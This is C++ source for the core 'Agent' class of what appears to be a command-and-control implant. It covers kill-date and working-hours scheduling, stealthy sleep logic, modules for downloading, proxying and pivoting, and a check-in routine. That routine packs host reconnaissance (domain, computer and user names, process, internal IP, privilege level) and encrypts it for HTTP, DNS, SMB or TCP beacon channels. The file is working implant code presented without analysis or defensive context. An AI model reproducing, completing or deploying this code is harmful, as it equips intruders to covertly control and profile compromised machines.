#include "Agent.h"
#include "ApiLoader.h"
#include "utils.h"
#include "Packer.h"
#include "Crypt.h"

void* Agent::operator new(size_t sz) 
{
	void* p = MemAllocLocal(sz);
	return p;
}

void Agent::operator delete(void* p) noexcept 
{
	MemFreeLocal(&p, sizeof(Agent));
}

Agent::Agent()
{
	info        = new AgentInfo();
	config      = new AgentConfig();
	commander   = new Commander(this);
	downloader  = new Downloader(config->download_chunk_size);
	jober       = new JobsController();
	memorysaver = new MemorySaver();
	proxyfire   = new Proxyfire();
	pivotter    = new Pivotter();

	SessionKey = (PBYTE) MemAllocLocal(16);
	for (int i = 0; i < 16; i++)
		SessionKey[i] = GenerateRandom32() % 0x100;
}

BOOL Agent::IsActive()
{
	ULONG now = GetSystemTimeAsUnixTimestamp();
	return this->Active && !(this->config->kill_date && now >= this->config->kill_date);
}

ULONG Agent::GetWorkingSleep() 
{
    if ( !this->config->working_time )
        return 0;

    WORD endM   = (this->config->working_time >> 0) % 64;
    WORD endH   = (this->config->working_time >> 8) % 64;
    WORD startM = (this->config->working_time >> 16) % 64;
    WORD startH = (this->config->working_time >> 24) % 64;

	ULONG newSleepTime = 0;
	SYSTEMTIME SystemTime = { 0 };
    ApiWin->GetLocalTime(&SystemTime);

    if (SystemTime.wHour < startH) {
        newSleepTime = (startH - SystemTime.wHour) * 60 + (startM - SystemTime.wMinute);
    }
    else if (endH < SystemTime.wHour) {
        newSleepTime = (24 - SystemTime.wHour - 1) * 60 + (60 - SystemTime.wMinute);
        newSleepTime += startH * 60 + startM;
    }
    else if (SystemTime.wHour == startH && SystemTime.wMinute < startM) {
        newSleepTime = startM - SystemTime.wMinute;
    }
    else if (SystemTime.wHour == endH && endM <= SystemTime.wMinute) {
        newSleepTime = 23 * 60 + (60 + startM - SystemTime.wMinute);
    }
    else {
        return 0;
    }

    return newSleepTime * 60 - SystemTime.wSecond;
}

BYTE* Agent::BuildBeat(ULONG* size)
{
	BYTE flag = 0;
	flag += this->info->is_server; 
	flag <<= 1;
	flag += this->info->elevated;
	flag <<= 1;
	flag += this->info->sys64;
	flag <<= 1;
	flag += this->info->arch64;

	Packer* packer = new Packer();

	packer->Pack32(this->config->agent_type);
	packer->Pack32(this->info->agent_id);
	packer->Pack32(this->config->sleep_delay);
	packer->Pack32(this->config->jitter_delay);
	packer->Pack32(this->config->kill_date);
	packer->Pack32(this->config->working_time);
	packer->Pack16(this->info->acp);
	packer->Pack16(this->info->oemcp);
	packer->Pack8(this->info->gmt_offest);
	packer->Pack16(this->info->pid);
	packer->Pack16(this->info->tid);
	packer->Pack32(this->info->build_number);
	packer->Pack8(this->info->major_version);
	packer->Pack8(this->info->minor_version);
	packer->Pack32(this->info->internal_ip);
	packer->Pack8( flag );
	packer->PackBytes(this->SessionKey, 16);
	packer->PackStringA(this->info->domain_name);
	packer->PackStringA(this->info->computer_name);
	packer->PackStringA(this->info->username);
	packer->PackStringA(this->info->process_name);

	ULONG plainSize = packer->datasize();
	PBYTE plainData = packer->data();
	BOOL useAes = (this->config->crypto_type == CRYPTO_AES);

#if defined(BEACON_HTTP) || defined(BEACON_DNS)

	ULONG ivSize = useAes ? 16 : 0;
	ULONG beat_size = ivSize + plainSize;
	PBYTE beat = (PBYTE)MemAllocLocal(beat_size);
	if (beat) {
		if (useAes) {
			DWORD tick = ApiWin->GetTickCount();
			for (int i = 0; i < 16; i++) {
				beat[i] = (BYTE)(tick ^ (i * 7919) ^ (i << 3) ^ ((tick >> (i % 8)) & 0xFF));
				tick = tick * 1103515245 + 12345;
			}
			memcpy(beat + 16, plainData, plainSize);
			AesCtrEncryptBuffer(beat + 16, plainSize, this->config->encrypt_key, 16, beat, 16);
		} else {
			memcpy(beat, plainData, plainSize);
			EncryptRC4(beat, plainSize, this->config->encrypt_key, 16);
		}
	}
	MemFreeLocal((LPVOID*)&plainData, plainSize);

#elif defined(BEACON_SMB) 

	ULONG ivSize = useAes ? 16 : 0;
	ULONG beat_size = 4 + ivSize + plainSize;
	PBYTE beat = (PBYTE)MemAllocLocal(beat_size);
	if (beat) {
		memcpy(beat, &(this->config->listener_type), 4);
		if (useAes) {
			DWORD tick = ApiWin->GetTickCount();
			for (int i = 0; i < 16; i++) {
				beat[4 + i] = (BYTE)(tick ^ (i * 7919) ^ (i << 3) ^ ((tick >> (i % 8)) & 0xFF));
				tick = tick * 1103515245 + 12345;
			}
			memcpy(beat + 4 + 16, plainData, plainSize);
			AesCtrEncryptBuffer(beat + 4 + 16, plainSize, this->config->encrypt_key, 16, beat + 4, 16);
		} else {
			memcpy(beat + 4, plainData, plainSize);
			EncryptRC4(beat + 4, plainSize, this->config->encrypt_key, 16);
		}
	}
	MemFreeLocal((LPVOID*)&plainData, plainSize);

#elif defined(BEACON_TCP) 

	ULONG ivSize = useAes ? 16 : 0;
	ULONG beat_size = 4 + ivSize + plainSize;
	PBYTE beat = (PBYTE)MemAllocLocal(beat_size);
	if (beat) {
		memcpy(beat, &(this->config->listener_type), 4);
		if (useAes) {
			DWORD tick = ApiWin->GetTickCount();
			for (int i = 0; i < 16; i++) {
				beat[4 + i] = (BYTE)(tick ^ (i * 7919) ^ (i << 3) ^ ((tick >> (i % 8)) & 0xFF));
				tick = tick * 1103515245 + 12345;
			}
			memcpy(beat + 4 + 16, plainData, plainSize);
			AesCtrEncryptBuffer(beat + 4 + 16, plainSize, this->config->encrypt_key, 16, beat + 4, 16);
		} else {
			memcpy(beat + 4, plainData, plainSize);
			EncryptRC4(beat + 4, plainSize, this->config->encrypt_key, 16);
		}
	}
	MemFreeLocal((LPVOID*)&plainData, plainSize);

#endif

	MemFreeLocal((LPVOID*)&this->info->domain_name,   StrLenA(this->info->domain_name));
	MemFreeLocal((LPVOID*)&this->info->computer_name, StrLenA(this->info->computer_name));
	MemFreeLocal((LPVOID*)&this->info->username,      StrLenA(this->info->username));
	MemFreeLocal((LPVOID*)&this->info->process_name,  StrLenA(this->info->process_name));

	delete packer;

	*size = beat_size;
	return beat;
}
